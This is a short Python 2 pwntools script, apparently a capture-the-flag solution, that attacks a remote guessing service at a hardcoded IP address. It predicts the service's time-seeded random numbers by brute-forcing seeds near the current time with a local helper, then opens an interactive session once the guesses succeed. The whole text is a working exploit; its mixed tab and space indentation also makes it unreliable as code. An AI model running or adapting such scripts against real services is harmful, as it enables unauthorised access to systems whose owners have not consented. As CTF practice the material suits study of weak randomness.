from pwn import *
import os
import os
import calendar
import time
ctime=int(calendar.timegm(time.gmtime()))
print 'Time {}'.format(ctime)
for t in xrange(ctime-5,ctime+5):
    p=remote('101.200.187.112','9001')
    p.recv()
    p.sendline('nonick')
    p.recvuntil('guess :')
    print '[+] Trying {}'.format(t)
    d=os.popen('./rnd {}'.format(t))
    nums=d.read()
    for rnum in nums.split():
        n=str(rnum)
        print '[+] Num: '+n
        p.sendline(n)
        r=p.recv()
        print r
        if 'Wrong' in r:
            p.close()
            break
        if 'want:' in r:
             p.interactive()
    try:
	p.interactive()
        print p.recv()
    except:
        continue

